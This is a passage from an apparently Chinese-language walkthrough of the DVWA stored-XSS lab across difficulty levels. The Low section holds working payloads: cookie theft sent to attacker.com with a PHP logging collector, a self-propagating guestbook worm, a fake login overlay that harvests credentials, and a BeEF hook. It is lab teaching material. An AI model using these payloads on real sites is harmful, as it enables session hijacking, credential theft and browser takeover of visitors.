<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 姓名输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 留言输入 --&gt;</span></span><br><span class="line">Normal message</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 提交后 --&gt;</span></span><br><span class="line">数据库存储：name = &#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br><span class="line">每次有人访问留言板，都会弹出XSS对话框</span><br></pre></td></tr></table></figure>

<p><strong>攻击2：在Message字段注入</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 姓名输入 --&gt;</span></span><br><span class="line">Alice</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 留言输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 结果 --&gt;</span></span><br><span class="line">所有访问者都会看到自己的Cookie</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：窃取所有用户Cookie"><a href="#步骤2：窃取所有用户Cookie" class="headerlink" title="步骤2：窃取所有用户Cookie"></a>步骤2：窃取所有用户Cookie</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 留言内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 将Cookie发送到攻击者服务器</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">img.<span class="property">src</span> = <span class="string">&#x27;http://attacker.com/steal.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 或更隐蔽的方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;this.src=&#x27;http://attacker.com/?c=&#x27;+document.cookie&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>攻击者服务器（steal.php）：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 记录所有访问者的Cookie</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;stolen_cookies.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="string">&quot;<span class="subst">$time</span> - <span class="subst">$ip</span> - <span class="subst">$cookie</span>\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回1x1透明图片（不让用户发现）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: image/png&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤3：XSS蠕虫（自我复制）"><a href="#步骤3：XSS蠕虫（自我复制）" class="headerlink" title="步骤3：XSS蠕虫（自我复制）"></a>步骤3：XSS蠕虫（自我复制）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 读取自己的恶意代码</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> payload = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.comment .message&#x27;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 自动提交留言表单，复制自己</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/dvwa/vulnerabilities/xss_s/&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>(<span class="string">&#x27;txtName=Worm&amp;mtxMessage=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(payload) + <span class="string">&#x27;&amp;btnSign=Sign+Guestbook&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 结果：每个访问者都会自动发布一条相同的恶意留言 --&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：钓鱼攻击"><a href="#步骤4：钓鱼攻击" class="headerlink" title="步骤4：钓鱼攻击"></a>步骤4：钓鱼攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">// 覆盖整个页面内容</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.body.innerHTML = `</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;max-width:400px;margin:100px auto;padding:20px;border:1px solid #ccc;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Session Expired<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please login again to continue:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://attacker.com/phish.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;padding:10px;margin:10px 0;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;padding:10px;margin:10px 0;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;padding:10px;background:#007bff;color:white;border:none;&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：BeEF挂钩（控制浏览器）"><a href="#步骤5：BeEF挂钩（控制浏览器）" class="headerlink" title="步骤5：BeEF挂钩（控制浏览器）"></a>步骤5：BeEF挂钩（控制浏览器）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在留言中插入BeEF钩子 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker.com:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 所有访问留言板的用户浏览器都会被BeEF控制 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 攻击者可以： --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 查看浏览器信息 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 键盘记录 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 截屏 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 获取摄像头 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 端口扫描 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - 社会工程学攻击 --&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了简单的过滤，但可以绕过。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用strip_tags()移除HTML标签 ★★★</span></span><br><span class="line">    <span class="comment">// strip_tags() - 从字符串中去除HTML和PHP标签</span></span><br><span class="line">    <span class="comment">// 参数1：要处理的字符串</span></span><br><span class="line">    <span class="comment">// 参数2：允许的标签（可选，这里未指定，移除所有标签）</span></span><br><span class="line">    <span class="comment">// 返回值：移除标签后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 作用：移除&lt;script&gt;、&lt;img&gt;等所有HTML标签</span></span><br><span class="line">    <span class="comment">// 例如：&lt;script&gt;alert(1)&lt;/script&gt; → alert(1)</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$name</span> ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用mysqli_real_escape_string()转义 ★★★</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用strip_tags()处理留言内容 ★★★</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入数据库</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>strip_tags()</strong> - 移除所有HTML标签</li>
<li><strong>addslashes()</strong> - 添加反斜杠转义</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>关键问题：</strong></p>
<p>虽然使用了<code>strip_tags()</code>，但：</p>
<ol>
<li><strong>Name字段限制长度</strong> - 通常很短，难以注入</li>
<li><strong>Message字段也使用strip_tags()</strong> - 标签被移除</li>
<li><strong>但输出时仍未编码</strong> - 可能存在绕过方式</li>
</ol>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>Medium难度的限制：</strong></p>
<p>DVWA Medium难度的存储型XSS实际上很难绕过，因为：</p>
<ul>
<li>Name字段长度限制</li>
<li>Message字段使用strip_tags()</li>
<li>几乎所有HTML标签都被移除</li>
</ul>
<p><strong>理论绕过（在某些场景下）：</strong></p>
<p>如果输出上下文特殊，可能利用：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果数据被输出到JavaScript中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> name = <span class="string">&#x27;&lt;?php echo $name; ?&gt;&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即使没有HTML标签，仍可注入 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Payload: &#x27;; alert(&#x27;XSS&#x27;); // --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如果数据被输出到HTML属性中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $name; ?&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Payload: &quot; onload=alert(&#x27;XSS&#x27;) // --&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>实际情况：</strong></p>
<p>Medium难度的DVWA存储型XSS使用了strip_tags()，基本可以防止大部分攻击。但这不代表strip_tags()是完美的防御，在某些复杂场景下仍可能被绕过。</p>
<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>更严格的过滤，但仍有绕过可能。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ Name字段：使用strip_tags()和addslashes() ★★★</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$name</span> ) );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ Message字段：使用strip_tags()和正则过滤 ★★★</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入数据库</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><p>High难度与Medium类似，主要防护：</p>
<ol>
<li><strong>strip_tags()</strong> - 移除HTML标签</li>
<li><strong>严格的输入验证</strong></li>
</ol>
<h3 id="为什么难以绕过？"><a href="#为什么难以绕过？" class="headerlink" title="为什么难以绕过？"></a>为什么难以绕过？</h3><p>由于使用了<code>strip_tags()</code>，所有HTML标签都被移除，很难进行传统的XSS攻击。</p>
<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用htmlspecialchars()和PDO，真正安全。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="comment">// checkToken() - 验证CSRF token</span></span><br><span class="line">    <span class="comment">// 防止跨站请求伪造攻击</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> 